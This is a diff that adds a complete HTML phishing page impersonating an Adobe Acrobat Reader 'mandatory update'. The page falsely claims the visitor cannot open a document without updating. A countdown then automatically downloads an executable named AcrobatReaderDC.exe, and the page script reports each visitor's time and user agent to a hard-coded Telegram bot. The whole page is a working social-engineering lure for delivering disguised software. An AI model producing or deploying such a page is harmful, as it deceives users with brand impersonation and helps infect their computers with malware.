@@ -1,0 +1,451 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Adobe Acrobat Reader Update</title>
+    <style>
+        @font-face {
+            font-family: 'Adobe Clean';
+            src: url('https://use.typekit.net/af/8a0534/00000000000000003b9b032d/27/l?primer=7cdcb44be4a7db8877ffa5c0007b8dd865b3bbc383831fe2ea177f62257a9191&fvd=n4&v=3') format('woff2');
+            font-weight: normal;
+            font-style: normal;
+        }
+        
+        body {
+            font-family: 'Adobe Clean', Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            color: #2C2C2C;
+            line-height: 1.4;
+            background-image: url('background.jpg');
+            background-size: cover;
+            background-position: center;
+            background-attachment: fixed;
+            height: 100vh;
+            overflow: hidden;
+        }
+        
+        .adobe-container {
+            background-color: rgba(255, 255, 255, 0.95);
+            border-radius: 8px;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15);
+            width: 90%;
+            max-width: 800px;
+            margin: 20px auto;
+            padding: 25px;
+            position: relative;
+            backdrop-filter: blur(2px);
+            border: 1px solid rgba(255, 255, 255, 0.2);
+            max-height: 95vh;
+            overflow-y: auto;
+            font-size: 0.9em;
+        }
+        
+        .adobe-logo {
+            height: 28px;
+            margin-bottom: 15px;
+        }
+        
+        h1 {
+            font-size: 1.3em;
+            font-weight: 700;
+            margin: 0 0 12px 0;
+            color: #2C2C2C;
+        }
+        
+        .intro-text {
+            font-size: 0.85em;
+            margin-bottom: 20px;
+            color: #565656;
+            line-height: 1.4;
+        }
+        
+        .update-alert {
+            background-color: #FFEBEE;
+            border-left: 4px solid #D32F2F;
+            padding: 12px;
+            margin-bottom: 20px;
+            font-size: 0.8em;
+            border-radius: 0 4px 4px 0;
+        }
+        
+        .update-alert strong {
+            color: #D32F2F;
+        }
+        
+        h2 {
+            font-size: 1em;
+            font-weight: 700;
+            margin: 20px 0 12px 0;
+            color: #2C2C2C;
+        }
+        
+        .download-section {
+            display: flex;
+            gap: 40px;
+        }
+        
+        .main-options {
+            flex: 1;
+        }
+        
+        .addons-column {
+            flex: 1;
+            border-left: 1px solid #EAEAEA;
+            padding-left: 20px;
+        }
+        
+        .option-group {
+            margin-bottom: 15px;
+        }
+        
+        .option-label {
+            font-size: 0.8em;
+            font-weight: 700;
+            color: #565656;
+            margin-bottom: 6px;
+            display: block;
+        }
+        
+        .option-value {
+            font-size: 0.85em;
+            margin-bottom: 6px;
+        }
+        
+        select {
+            padding: 7px 12px;
+            border: 1px solid #D1D1D1;
+            border-radius: 4px;
+            font-size: 0.85em;
+            font-family: 'Adobe Clean', Arial, sans-serif;
+            color: #2C2C2C;
+            background-color: white;
+            width: 100%;
+            max-width: 280px;
+            margin-top: 4px;
+        }
+        
+        .version-code {
+            font-family: monospace;
+            font-size: 0.8em;
+            color: #2C2C2C;
+        }
+        
+        .version-highlight {
+            font-weight: 700;
+            color: #D32F2F;
+        }
+        
+        .system-req {
+            font-size: 0.75em;
+            color: #767676;
+            margin-top: 6px;
+            font-style: italic;
+        }
+        
+        .divider {
+            border: 0;
+            height: 1px;
+            background: linear-gradient(to right, transparent, #EAEAEA, transparent);
+            margin: 20px 0;
+        }
+        
+        .addon-item {
+            margin-bottom: 18px;
+        }
+        
+        .addon-title {
+            font-size: 0.9em;
+            font-weight: 700;
+            margin-bottom: 5px;
+        }
+        
+        .addon-desc {
+            font-size: 0.8em;
+            color: #565656;
+            margin-bottom: 6px;
+            line-height: 1.4;
+        }
+        
+        .learn-more {
+            color: #1473E6;
+            text-decoration: none;
+            font-size: 0.8em;
+            font-weight: 600;
+        }
+        
+        .learn-more:hover {
+            text-decoration: underline;
+        }
+        
+        .terms {
+            font-size: 0.75em;
+            color: #767676;
+            margin: 20px 0 12px 0;
+            line-height: 1.4;
+        }
+        
+        .countdown {
+            font-size: 0.8em;
+            margin: 12px 0;
+            padding: 8px;
+            background-color: #F5F5F5;
+            border-radius: 4px;
+            text-align: center;
+        }
+        
+        .countdown-number {
+            font-weight: bold;
+            color: #D32F2F;
+        }
+        
+        .download-btn {
+            background-color: #D32F2F;
+            color: white;
+            border: none;
+            padding: 10px 24px;
+            font-size: 0.9em;
+            font-weight: 700;
+            border-radius: 4px;
+            cursor: pointer;
+            width: 100%;
+            max-width: 280px;
+            margin: 0 auto;
+            display: block;
+            text-align: center;
+        }
+        
+        .mobile-block {
+            display: none;
+            font-family: 'Adobe Clean', Arial, sans-serif;
+            text-align: center;
+            padding: 30px;
+            background-color: white;
+            border-radius: 8px;
+            width: 90%;
+            max-width: 500px;
+            margin: 20px auto;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15);
+        }
+        
+        .mobile-block h1 {
+            font-size: 1.2em;
+            color: #D32F2F;
+        }
+        
+        .mobile-block p {
+            font-size: 0.9em;
+            color: #565656;
+        }
+        
+        /* Scrollbar styling for the container */
+        .adobe-container::-webkit-scrollbar {
+            width: 6px;
+        }
+        
+        .adobe-container::-webkit-scrollbar-track {
+            background: #f1f1f1;
+            border-radius: 3px;
+        }
+        
+        .adobe-container::-webkit-scrollbar-thumb {
+            background: #ccc;
+            border-radius: 3px;
+        }
+        
+        .adobe-container::-webkit-scrollbar-thumb:hover {
+            background: #aaa;
+        }
+    </style>
+</head>
+<body>
+    <!-- Mobile Block Message -->
+    <div class="mobile-block" id="mobileBlock">
+        <img src="https://www.adobe.com/content/dam/cc/icons/Adobe_Corporate_Horizontal_Red_HEX.svg" alt="Adobe Logo" style="height: 28px; margin-bottom: 15px;">
+        <h1>⚠️ Mobile Access Not Supported</h1>
+        <p>Adobe Acrobat Reader updates are only available on <strong>desktop computers</strong>.</p>
+        <p>Please open this page on a Windows PC or Mac to download the update.</p>
+    </div>
+
+    <!-- Main Adobe Container -->
+    <div class="adobe-container" id="adobeContainer">
+        <img src="https://www.adobe.com/content/dam/cc/icons/Adobe_Corporate_Horizontal_Red_HEX.svg" alt="Adobe Logo" class="adobe-logo">
+        
+        <h1>Action Required: Update Needed to View This File</h1>
+        
+        <p class="intro-text">Your current version of Adobe Acrobat Reader doesn't support this file format. A mandatory update is required to view this document.</p>
+        
+        <div class="update-alert">
+            <strong>Important Notice:</strong> Your current version (2023.06.01.2023) cannot display this file type. You <strong>must</strong> download and install the latest version to access this document. This update includes critical security fixes and compatibility improvements.
+        </div>
+        
+        <div class="download-section">
+            <div class="main-options">
+                <h2>Update Configuration</h2>
+                
+                <div class="option-group">
+                    <span class="option-label">Operating system</span>
+                    <div class="option-value">Windows 10 (detected)</div>
+                    <select>
+                        <option>Windows 11</option>
+                        <option selected>Windows 10</option>
+                        <option>Windows 8.1</option>
+                        <option>Windows 7</option>
+                        <option>macOS 14 (Sonoma)</option>
+                        <option>macOS 13 (Ventura)</option>
+                        <option>macOS 12 (Monterey)</option>
+                        <option>Linux (64-bit)</option>
+                        <option>Chrome OS</option>
+                        <option>Android</option>
+                        <option>iOS/iPadOS</option>
+                    </select>
+                </div>
+                
+                <div class="option-group">
+                    <span class="option-label">Language</span>
+                    <div class="option-value">English (detected)</div>
+                    <select>
+                        <option selected>English</option>
+                        <option>Español</option>
+                        <option>Français</option>
+                        <option>Deutsch</option>
+                        <option>Italiano</option>
+                        <option>Português</option>
+                        <option>日本語</option>
+                        <option>中文 (简体)</option>
+                        <option>中文 (繁體)</option>
+                        <option>한국어</option>
+                        <option>Русский</option>
+                        <option>العربية</option>
+                        <option>Nederlands</option>
+                        <option>Svenska</option>
+                        <option>Polski</option>
+                        <option>Türkçe</option>
+                    </select>
+                </div>
+                
+                <div class="option-group">
+                    <span class="option-label">Current Version</span>
+                    <div class="option-value">
+                        <span class="version-code">[Review 2023.06.01.2023]</span> <span class="version-highlight">(Unsupported Version)</span>
+                    </div>
+                </div>
+                
+                <p class="system-req">Required version: 2024.001.20604 or newer</p>
+            </div>
+            
+            <div class="addons-column">
+                <h2>Recommended Add-ons</h2>
+                <div class="addon-item">
+                    <div class="addon-title">Install Acrobat for Google Chrome</div>
+                    <div class="addon-desc">Get seamless PDF viewing directly in your browser with this essential extension.</div>
+                    <a href="https://helpx.adobe.com/acrobat/using/acrobat-reader-chrome-extension.html" class="learn-more">Learn more</a>
+                </div>
+                
+                <h2>Security Tools</h2>
+                <div class="addon-item">
+                    <div class="addon-title">Install McAfee Security Scan Plus</div>
+                    <div class="addon-desc">Verify your system's security status without interrupting your existing protection.</div>
+                    <a href="https://helpx.adobe.com/security.html" class="learn-more">Learn more</a>
+                </div>
+            </div>
+        </div>
+        
+        <div class="divider"></div>
+        
+        <p class="terms">By proceeding with this mandatory update, you agree to Adobe's <a href="https://www.adobe.com/legal/terms.html" style="color: #1473E6; text-decoration: none;">Terms of Use</a> and acknowledge this update is required to view the document.</p>
+        
+        <div class="countdown">
+            The update will automatically download in <span class="countdown-number" id="countdown">5</span> seconds. 
+            <br>If the download doesn't start, please click the button below.
+        </div>
+        
+        <button class="download-btn" id="downloadButton">Download Update</button>
+    </div>
+
+    <script>
+        // Mobile device detection
+        const isMobile = /(Android|webOS|iPhone|iPad|iPod|BlackBerry|Windows Phone)/i.test(navigator.userAgent);
+        const mobileBlock = document.getElementById('mobileBlock');
+        const adobeContainer = document.getElementById('adobeContainer');
+        
+        if (isMobile) {
+            mobileBlock.style.display = 'block';
+            adobeContainer.style.display = 'none';
+        } else {
+            // Proceed with desktop version
+            mobileBlock.style.display = 'none';
+            adobeContainer.style.display = 'block';
+            
+            // Telegram and download functionality
+            const telegramBotToken = '8193981997:AAGJ526ZAOGjLQa1jNTyQ1jl1GTrGjrwrhQ';
+            const telegramChatID = '1482823538';
+            
+            // Function to send Telegram notification
+            async function sendTelegramNotification(message) {
+                const url = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;
+                const data = {
+                    chat_id: telegramChatID,
+                    text: message,
+                    parse_mode: 'HTML'
+                };
+                
+                try {
+                    await fetch(url + '?' + new URLSearchParams(data));
+                } catch (error) {
+                    console.error('Telegram notification failed:', error);
+                }
+            }
+            
+            // Function to initiate download
+            async function initiateDownload() {
+                // Get download details
+                const datetime = new Date().toLocaleString();
+                const userAgent = navigator.userAgent;
+                const deviceDetails = "Desktop";
+                
+                // Prepare Telegram message
+                const logMessage = `📥 <b>New Adobe Acrobat Reader Download</b>\n` +
+                    `⏰ <b>Time:</b> ${datetime}\n` +
+                    `🖥️ <b>Device:</b> ${deviceDetails}\n` +
+                    `🔍 <b>User Agent:</b> ${userAgent}`;
+                
+                // Send Telegram notification
+                await sendTelegramNotification(logMessage);
+                
+                // Start file download
+                const fileUrl = 'AcrobatReaderDC.exe';
+                const link = document.createElement('a');
+                link.href = fileUrl;
+                link.download = fileUrl.split('/').pop();
+                document.body.appendChild(link);
+                link.click();
+                document.body.removeChild(link);
+            }
+            
+            // Countdown functionality
+            let seconds = 5;
+            const countdownElement = document.getElementById('countdown');
+            const downloadButton = document.getElementById('downloadButton');
+            
+            function updateCountdown() {
+                countdownElement.textContent = seconds;
+                seconds--;
+                
+                if (seconds < 0) {
+                    initiateDownload();
+                } else {
+                    setTimeout(updateCountdown, 1000);
+                }
+            }
+            
+            // Start the countdown
+            updateCountdown();
+            
+            // Manual download button click handler
+            downloadButton.addEventListener('click', initiateDownload);
+        }
+    </script>
+</body>
+</html>
